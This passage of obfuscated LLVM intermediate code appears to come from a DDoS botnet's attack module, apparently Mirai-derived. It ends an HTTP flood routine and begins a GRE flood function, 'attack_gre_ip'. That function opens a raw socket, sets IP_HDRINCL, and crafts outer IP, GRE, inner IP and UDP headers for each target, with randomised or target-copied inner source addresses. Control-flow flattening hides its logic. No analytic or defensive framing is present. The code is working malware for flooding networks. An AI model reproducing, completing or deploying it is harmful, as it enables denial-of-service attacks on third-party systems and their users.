  %2616 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2615, i32 0, i32 17
  %2617 = load i32, i32* %2616, align 4
  %2618 = sext i32 %2617 to i64
  %2619 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2614, i64 0, i64 %2618
  store i8 0, i8* %2619, align 1
  %2620 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2621 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2620, i32 0, i32 17
  %2622 = load i32, i32* %2621, align 4
  %2623 = icmp eq i32 %2622, 0
  %2624 = select i1 %2623, i32 473402162, i32 816759265
  store i32 %2624, i32* %switchVar
  br label %loopEnd

; <label>:2625:                                   ; preds = %loopEntry
  store i32 1187789126, i32* %switchVar
  br label %loopEnd

; <label>:2626:                                   ; preds = %loopEntry
  store i32 327894863, i32* %switchVar
  br label %loopEnd

; <label>:2627:                                   ; preds = %loopEntry
  store i32 -555281403, i32* %switchVar
  br label %loopEnd

; <label>:2628:                                   ; preds = %loopEntry
  store i32 -1593413651, i32* %switchVar
  br label %loopEnd

; <label>:2629:                                   ; preds = %loopEntry
  store i32 -1113533947, i32* %switchVar
  br label %loopEnd

; <label>:2630:                                   ; preds = %loopEntry
  %2631 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2632 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2631, i32 0, i32 1
  %2633 = load i8, i8* %2632, align 4
  %2634 = zext i8 %2633 to i32
  %2635 = icmp eq i32 %2634, 10
  %2636 = select i1 %2635, i32 -1152556891, i32 -1712483427
  store i32 %2636, i32* %switchVar
  br label %loopEnd

; <label>:2637:                                   ; preds = %loopEntry
  store i32 -1969078666, i32* %switchVar
  br label %loopEnd

; <label>:2638:                                   ; preds = %loopEntry
  %2639 = call i32* @__errno_location() #7
  store i32 0, i32* %2639, align 4
  %2640 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2641 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2640, i32 0, i32 0
  %2642 = load i32, i32* %2641, align 4
  %2643 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2644 = call i64 @recv(i32 %2642, i8* %2643, i64 10240, i32 16384)
  %2645 = trunc i64 %2644 to i32
  store i32 %2645, i32* %12, align 4
  %2646 = load i32, i32* %12, align 4
  %2647 = icmp eq i32 %2646, 0
  %2648 = select i1 %2647, i32 794879738, i32 1100810801
  store i32 %2648, i32* %switchVar
  br label %loopEnd

; <label>:2649:                                   ; preds = %loopEntry
  %2650 = call i32* @__errno_location() #7
  store i32 104, i32* %2650, align 4
  store i32 -1, i32* %12, align 4
  store i32 1100810801, i32* %switchVar
  br label %loopEnd

; <label>:2651:                                   ; preds = %loopEntry
  %2652 = load i32, i32* %12, align 4
  %2653 = icmp eq i32 %2652, -1
  %2654 = select i1 %2653, i32 -1314307020, i32 1699880013
  store i32 %2654, i32* %switchVar
  br label %loopEnd

; <label>:2655:                                   ; preds = %loopEntry
  %2656 = call i32* @__errno_location() #7
  %2657 = load i32, i32* %2656, align 4
  %2658 = icmp ne i32 %2657, 11
  %2659 = select i1 %2658, i32 1906433785, i32 1009530701
  store i32 %2659, i32* %switchVar
  br label %loopEnd

; <label>:2660:                                   ; preds = %loopEntry
  %2661 = call i32* @__errno_location() #7
  %2662 = load i32, i32* %2661, align 4
  %2663 = icmp ne i32 %2662, 11
  %2664 = select i1 %2663, i32 -570448256, i32 1009530701
  store i32 %2664, i32* %switchVar
  br label %loopEnd

; <label>:2665:                                   ; preds = %loopEntry
  %2666 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2667 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2666, i32 0, i32 0
  %2668 = load i32, i32* %2667, align 4
  %2669 = call i32 @close(i32 %2668)
  %2670 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2671 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2670, i32 0, i32 0
  store i32 -1, i32* %2671, align 4
  %2672 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2673 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2672, i32 0, i32 1
  store i8 0, i8* %2673, align 4
  store i32 1009530701, i32* %switchVar
  br label %loopEnd

; <label>:2674:                                   ; preds = %loopEntry
  store i32 1235200906, i32* %switchVar
  br label %loopEnd

; <label>:2675:                                   ; preds = %loopEntry
  store i32 -1969078666, i32* %switchVar
  br label %loopEnd

; <label>:2676:                                   ; preds = %loopEntry
  %2677 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2678 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2677, i32 0, i32 1
  %2679 = load i8, i8* %2678, align 4
  %2680 = zext i8 %2679 to i32
  %2681 = icmp ne i32 %2680, 0
  %2682 = select i1 %2681, i32 1028883058, i32 -411279089
  store i32 %2682, i32* %switchVar
  br label %loopEnd

; <label>:2683:                                   ; preds = %loopEntry
  %2684 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2685 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2684, i32 0, i32 1
  store i8 1, i8* %2685, align 4
  store i32 -411279089, i32* %switchVar
  br label %loopEnd

; <label>:2686:                                   ; preds = %loopEntry
  store i32 -1712483427, i32* %switchVar
  br label %loopEnd

; <label>:2687:                                   ; preds = %loopEntry
  store i32 -1113533947, i32* %switchVar
  br label %loopEnd

; <label>:2688:                                   ; preds = %loopEntry
  store i32 -1957351390, i32* %switchVar
  br label %loopEnd

; <label>:2689:                                   ; preds = %loopEntry
  store i32 -1870544277, i32* %switchVar
  br label %loopEnd

; <label>:2690:                                   ; preds = %loopEntry
  store i32 875992331, i32* %switchVar
  br label %loopEnd

; <label>:2691:                                   ; preds = %loopEntry
  %2692 = load i32, i32* %9, align 4
  %2693 = add nsw i32 %2692, 1
  store i32 %2693, i32* %9, align 4
  store i32 -1888894083, i32* %switchVar
  br label %loopEnd

; <label>:2694:                                   ; preds = %loopEntry
  store i32 1290577000, i32* %switchVar
  br label %loopEnd

; <label>:2695:                                   ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %2694, %2691, %2690, %2689, %2688, %2687, %2686, %2683, %2676, %2675, %2674, %2665, %2660, %2655, %2651, %2649, %2638, %2637, %2630, %2629, %2628, %2627, %2626, %2625, %2594, %2593, %2589, %2588, %2587, %2584, %2571, %2570, %2564, %2561, %2553, %2543, %2522, %2512, %2506, %2500, %2499, %2498, %2493, %2406, %2397, %2364, %2353, %2342, %2338, %2334, %2325, %2319, %2310, %2309, %2300, %2295, %2290, %2286, %2284, %2261, %2249, %2243, %2242, %2235, %2234, %2227, %2218, %2217, %2214, %2211, %2206, %2203, %2195, %2184, %2183, %2182, %2175, %2174, %2173, %2172, %2161, %2148, %2139, %2132, %2131, %2130, %2119, %2106, %2097, %2091, %2086, %2081, %2078, %2073, %2064, %2055, %2045, %2042, %2035, %2024, %2022, %2020, %2013, %2009, %2005, %2002, %2001, %1988, %1969, %1960, %1947, %1934, %1931, %1916, %1907, %1904, %1902, %1894, %1885, %1876, %1868, %1865, %1858, %1846, %1843, %1831, %1824, %1823, %1820, %1819, %1818, %1807, %1798, %1785, %1778, %1777, %1776, %1765, %1752, %1743, %1737, %1732, %1727, %1724, %1719, %1710, %1701, %1691, %1688, %1681, %1668, %1665, %1658, %1646, %1643, %1631, %1624, %1620, %1619, %1618, %1617, %1602, %1597, %1593, %1590, %1589, %1588, %1576, %1569, %1567, %1558, %1555, %1554, %1553, %1544, %1538, %1530, %1515, %1499, %1496, %1487, %1470, %1467, %1450, %1448, %1443, %1433, %1432, %1429, %1428, %1418, %1415, %1408, %1396, %1393, %1381, %1374, %1373, %1372, %1369, %1356, %1353, %1346, %1334, %1331, %1319, %1310, %1309, %1308, %1305, %1292, %1289, %1282, %1270, %1267, %1255, %1246, %1243, %1236, %1233, %1221, %1220, %1216, %1210, %1201, %1191, %1184, %1166, %1165, %1156, %1153, %1149, %1140, %1122, %1121, %1111, %1106, %1105, %1104, %1094, %1093, %1089, %1086, %1085, %1084, %1083, %1082, %1081, %1080, %1079, %1070, %1061, %1054, %1053, %1048, %1026, %1019, %1018, %1013, %991, %984, %983, %978, %956, %949, %948, %943, %908, %900, %890, %882, %872, %865, %862, %843, %836, %829, %823, %782, %669, %662, %661, %656, %634, %625, %617, %610, %609, %604, %546, %545, %539, %534, %527, %520, %519, %516, %513, %507, %496, %491, %490, %481, %480, %471, %468, %467, %464, %455, %NewDefault, %446, %437, %428, %419, %410, %401, %392, %383, %374, %365, %356, %347, %338, %329, %320, %LeafBlock, %NodeBlock, %NodeBlock1, %NodeBlock3, %NodeBlock5, %NodeBlock7, %NodeBlock9, %NodeBlock11, %NodeBlock13, %NodeBlock15, %NodeBlock17, %LeafBlock19, %NodeBlock21, %NodeBlock23, %NodeBlock25, %NodeBlock27, %301, %271, %234, %206, %163, %158, %153, %152, %148, %145, %144, %135, %126, %117, %111, %110, %109, %104, %103, %98, %97, %92, %91, %87, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

declare i32 @util_strlen(i8*) #3

declare i32 @util_strcpy(i8*, i8*) #3

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #2

; Function Attrs: nounwind
declare i64 @time(i64*) #1

declare i32 @close(i32) #3

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #1

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #1

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #2

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

declare void @util_zero(i8*, i32) #3

declare i8* @util_itoa(i32, i32, i8*) #3

declare signext i8 @util_strcmp(i8*, i8*) #3

declare i64 @send(i32, i8*, i64, i32) #3

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #1

declare i64 @recv(i32, i8*, i64, i32) #3

declare i32 @util_stristr(i8*, i32, i8*) #3

declare signext i8 @util_strncmp(i8*, i8*, i32) #3

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_gre_ip(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i32, align 4
  %22 = alloca %struct.iphdr*, align 8
  %23 = alloca %struct.grehdr*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.grehdr*, align 8
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.udphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %33 = load i8, i8* %5, align 1
  %34 = zext i8 %33 to i64
  %35 = call noalias i8* @calloc(i64 %34, i64 8) #6
  %36 = bitcast i8* %35 to i8**
  store i8** %36, i8*** %11, align 8
  %37 = load i8, i8* %7, align 1
  %38 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %39 = call i32 @attack_get_opt_int(i8 zeroext %37, %struct.attack_option* %38, i8 zeroext 2, i32 0)
  %40 = trunc i32 %39 to i8
  store i8 %40, i8* %12, align 1
  %41 = load i8, i8* %7, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %43 = call i32 @attack_get_opt_int(i8 zeroext %41, %struct.attack_option* %42, i8 zeroext 3, i32 65535)
  %44 = trunc i32 %43 to i16
  store i16 %44, i16* %13, align 2
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 4, i32 64)
  %48 = trunc i32 %47 to i8
  store i8 %48, i8* %14, align 1
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 5, i32 1)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %15, align 1
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 6, i32 65535)
  %56 = trunc i32 %55 to i16
  store i16 %56, i16* %16, align 2
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 7, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %17, align 2
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 0, i32 512)
  store i32 %63, i32* %18, align 4
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 1, i32 1)
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %19, align 1
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 19, i32 0)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = load i32, i32* @LOCAL_ADDR, align 4
  %75 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 25, i32 %74)
  store i32 %75, i32* %21, align 4
  %76 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %76, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %10, align 4
  %switchVar = alloca i32
  store i32 1687603244, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1687603244, label %first
    i32 -1159999812, label %79
    i32 1681705938, label %80
    i32 -1613002758, label %86
    i32 1625356369, label %89
    i32 -295301570, label %90
    i32 -63601661, label %96
    i32 307303490, label %147
    i32 1611749394, label %151
    i32 -25227410, label %201
    i32 -1639762903, label %205
    i32 206067210, label %214
    i32 645521742, label %220
    i32 1226523860, label %228
    i32 603148405, label %244
    i32 -1023954082, label %247
    i32 -1984958055, label %248
    i32 1330538881, label %249
    i32 -675399415, label %255
    i32 1573392413, label %284
    i32 -907764176, label %305
    i32 -1346475826, label %309
    i32 -1365749353, label %313
    i32 1494986150, label %318
    i32 -1341725069, label %333
    i32 -1484096303, label %338
    i32 164636092, label %344
    i32 890794378, label %349
    i32 1426904814, label %355
    i32 -2117750045, label %359
    i32 -539473659, label %363
    i32 149177740, label %369
    i32 1164950364, label %373
    i32 652587879, label %376
    i32 -1131347947, label %443
    i32 2575309, label %446
    i32 1925746225, label %447
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %77 = icmp eq i32 %.reload, -1
  %78 = select i1 %77, i32 -1159999812, i32 1681705938
  store i32 %78, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  store i32 1925746225, i32* %switchVar
  br label %loopEnd

; <label>:80:                                     ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  %81 = load i32, i32* %10, align 4
  %82 = bitcast i32* %9 to i8*
  %83 = call i32 @setsockopt(i32 %81, i32 0, i32 3, i8* %82, i32 4) #6
  %84 = icmp eq i32 %83, -1
  %85 = select i1 %84, i32 -1613002758, i32 1625356369
  store i32 %85, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = load i32, i32* %10, align 4
  %88 = call i32 @close(i32 %87)
  store i32 1925746225, i32* %switchVar
  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -295301570, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  %91 = load i32, i32* %9, align 4
  %92 = load i8, i8* %5, align 1
  %93 = zext i8 %92 to i32
  %94 = icmp slt i32 %91, %93
  %95 = select i1 %94, i32 -63601661, i32 -1023954082
  store i32 %95, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  %97 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %98 = load i8**, i8*** %11, align 8
  %99 = load i32, i32* %9, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds i8*, i8** %98, i64 %100
  store i8* %97, i8** %101, align 8
  %102 = load i8**, i8*** %11, align 8
  %103 = load i32, i32* %9, align 4
  %104 = sext i32 %103 to i64
  %105 = getelementptr inbounds i8*, i8** %102, i64 %104
  %106 = load i8*, i8** %105, align 8
  %107 = bitcast i8* %106 to %struct.iphdr*
  store %struct.iphdr* %107, %struct.iphdr** %22, align 8
  %108 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %109 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %108, i64 1
  %110 = bitcast %struct.iphdr* %109 to %struct.grehdr*
  store %struct.grehdr* %110, %struct.grehdr** %23, align 8
  %111 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %112 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %111, i64 1
  %113 = bitcast %struct.grehdr* %112 to %struct.iphdr*
  store %struct.iphdr* %113, %struct.iphdr** %24, align 8
  %114 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %115 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %114, i64 1
  %116 = bitcast %struct.iphdr* %115 to %struct.udphdr*
  store %struct.udphdr* %116, %struct.udphdr** %25, align 8
  %117 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %118 = bitcast %struct.iphdr* %117 to i8*
  %119 = load i8, i8* %118, align 4
  %120 = and i8 %119, 15
  %121 = or i8 %120, 64
  store i8 %121, i8* %118, align 4
  %122 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %123 = bitcast %struct.iphdr* %122 to i8*
  %124 = load i8, i8* %123, align 4
  %125 = and i8 %124, -16
  %126 = or i8 %125, 5
  store i8 %126, i8* %123, align 4
  %127 = load i8, i8* %12, align 1
  %128 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %129 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %128, i32 0, i32 1
  store i8 %127, i8* %129, align 1
  %130 = load i32, i32* %18, align 4
  %131 = sext i32 %130 to i64
  %132 = add i64 52, %131
  %133 = trunc i64 %132 to i16
  %134 = call zeroext i16 @htons(i16 zeroext %133) #7
  %135 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %136 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %135, i32 0, i32 2
  store i16 %134, i16* %136, align 2
  %137 = load i16, i16* %13, align 2
  %138 = call zeroext i16 @htons(i16 zeroext %137) #7
  %139 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %140 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %139, i32 0, i32 3
  store i16 %138, i16* %140, align 4
  %141 = load i8, i8* %14, align 1
  %142 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %143 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %142, i32 0, i32 5
  store i8 %141, i8* %143, align 4
  %144 = load i8, i8* %15, align 1
  %145 = icmp ne i8 %144, 0
  %146 = select i1 %145, i32 307303490, i32 1611749394
  store i32 %146, i32* %switchVar
  br label %loopEnd

; <label>:147:                                    ; preds = %loopEntry
  %148 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %149 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %150 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %149, i32 0, i32 4
  store i16 %148, i16* %150, align 2
  store i32 1611749394, i32* %switchVar
  br label %loopEnd

; <label>:151:                                    ; preds = %loopEntry
  %152 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %153 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %152, i32 0, i32 6
  store i8 47, i8* %153, align 1
  %154 = load i32, i32* %21, align 4
  %155 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %156 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %155, i32 0, i32 8
  store i32 %154, i32* %156, align 4
  %157 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %158 = load i32, i32* %9, align 4
  %159 = sext i32 %158 to i64
  %160 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %157, i64 %159
  %161 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %160, i32 0, i32 1
  %162 = load i32, i32* %161, align 4
  %163 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %164 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %163, i32 0, i32 9
  store i32 %162, i32* %164, align 4
  %165 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %166 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %167 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %166, i32 0, i32 1
  store i16 %165, i16* %167, align 2
  %168 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %169 = bitcast %struct.iphdr* %168 to i8*
  %170 = load i8, i8* %169, align 4
  %171 = and i8 %170, 15
  %172 = or i8 %171, 64
  store i8 %172, i8* %169, align 4
  %173 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %174 = bitcast %struct.iphdr* %173 to i8*
  %175 = load i8, i8* %174, align 4
  %176 = and i8 %175, -16
  %177 = or i8 %176, 5
  store i8 %177, i8* %174, align 4
  %178 = load i8, i8* %12, align 1
  %179 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %180 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %179, i32 0, i32 1
  store i8 %178, i8* %180, align 1
  %181 = load i32, i32* %18, align 4
  %182 = sext i32 %181 to i64
  %183 = add i64 28, %182
  %184 = trunc i64 %183 to i16
  %185 = call zeroext i16 @htons(i16 zeroext %184) #7
  %186 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %187 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %186, i32 0, i32 2
  store i16 %185, i16* %187, align 2
  %188 = load i16, i16* %13, align 2
  %189 = zext i16 %188 to i32
  %190 = xor i32 %189, -1
  %191 = trunc i32 %190 to i16
  %192 = call zeroext i16 @htons(i16 zeroext %191) #7
  %193 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %194 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %193, i32 0, i32 3
  store i16 %192, i16* %194, align 4
  %195 = load i8, i8* %14, align 1
  %196 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %197 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %196, i32 0, i32 5
  store i8 %195, i8* %197, align 4
  %198 = load i8, i8* %15, align 1
  %199 = icmp ne i8 %198, 0
  %200 = select i1 %199, i32 -25227410, i32 -1639762903
  store i32 %200, i32* %switchVar
  br label %loopEnd

; <label>:201:                                    ; preds = %loopEntry
  %202 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %203 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %204 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %203, i32 0, i32 4
  store i16 %202, i16* %204, align 2
  store i32 -1639762903, i32* %switchVar
  br label %loopEnd

; <label>:205:                                    ; preds = %loopEntry
  %206 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %207 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %206, i32 0, i32 6
  store i8 17, i8* %207, align 1
  %208 = call i32 @rand_next()
  %209 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %210 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %209, i32 0, i32 8
  store i32 %208, i32* %210, align 4
  %211 = load i8, i8* %20, align 1
  %212 = icmp ne i8 %211, 0
  %213 = select i1 %212, i32 206067210, i32 645521742
  store i32 %213, i32* %switchVar
  br label %loopEnd

; <label>:214:                                    ; preds = %loopEntry
  %215 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %216 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %215, i32 0, i32 9
  %217 = load i32, i32* %216, align 4
  %218 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %219 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %218, i32 0, i32 9
  store i32 %217, i32* %219, align 4
  store i32 1226523860, i32* %switchVar
  br label %loopEnd

; <label>:220:                                    ; preds = %loopEntry
  %221 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %222 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %221, i32 0, i32 8
  %223 = load i32, i32* %222, align 4
  %224 = sub i32 %223, 1024
  %225 = xor i32 %224, -1
  %226 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %227 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %226, i32 0, i32 9
  store i32 %225, i32* %227, align 4
  store i32 1226523860, i32* %switchVar
  br label %loopEnd

; <label>:228:                                    ; preds = %loopEntry
  %229 = load i16, i16* %16, align 2
  %230 = call zeroext i16 @htons(i16 zeroext %229) #7
  %231 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %232 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %231, i32 0, i32 0
  store i16 %230, i16* %232, align 2
  %233 = load i16, i16* %17, align 2
  %234 = call zeroext i16 @htons(i16 zeroext %233) #7
  %235 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %236 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %235, i32 0, i32 1
  store i16 %234, i16* %236, align 2
  %237 = load i32, i32* %18, align 4
  %238 = sext i32 %237 to i64
  %239 = add i64 8, %238
  %240 = trunc i64 %239 to i16
  %241 = call zeroext i16 @htons(i16 zeroext %240) #7
  %242 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %243 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %242, i32 0, i32 2
  store i16 %241, i16* %243, align 2
  store i32 603148405, i32* %switchVar
  br label %loopEnd

; <label>:244:                                    ; preds = %loopEntry
  %245 = load i32, i32* %9, align 4
  %246 = add nsw i32 %245, 1
  store i32 %246, i32* %9, align 4
  store i32 -295301570, i32* %switchVar
  br label %loopEnd

; <label>:247:                                    ; preds = %loopEntry
  store i32 -1984958055, i32* %switchVar
  br label %loopEnd

; <label>:248:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 1330538881, i32* %switchVar
  br label %loopEnd

; <label>:249:                                    ; preds = %loopEntry
  %250 = load i32, i32* %9, align 4
  %251 = load i8, i8* %5, align 1
  %252 = zext i8 %251 to i32
  %253 = icmp slt i32 %250, %252
  %254 = select i1 %253, i32 -675399415, i32 2575309
  store i32 %254, i32* %switchVar
  br label %loopEnd

; <label>:255:                                    ; preds = %loopEntry
  %256 = load i8**, i8*** %11, align 8
  %257 = load i32, i32* %9, align 4
  %258 = sext i32 %257 to i64
  %259 = getelementptr inbounds i8*, i8** %256, i64 %258
  %260 = load i8*, i8** %259, align 8
  store i8* %260, i8** %26, align 8
  %261 = load i8*, i8** %26, align 8
  %262 = bitcast i8* %261 to %struct.iphdr*
  store %struct.iphdr* %262, %struct.iphdr** %27, align 8
  %263 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %264 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %263, i64 1
  %265 = bitcast %struct.iphdr* %264 to %struct.grehdr*
  store %struct.grehdr* %265, %struct.grehdr** %28, align 8
  %266 = load %struct.grehdr*, %struct.grehdr** %28, align 8
  %267 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %266, i64 1
  %268 = bitcast %struct.grehdr* %267 to %struct.iphdr*
  store %struct.iphdr* %268, %struct.iphdr** %29, align 8
  %269 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %270 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %269, i64 1
  %271 = bitcast %struct.iphdr* %270 to %struct.udphdr*
  store %struct.udphdr* %271, %struct.udphdr** %30, align 8
  %272 = load %struct.udphdr*, %struct.udphdr** %30, align 8
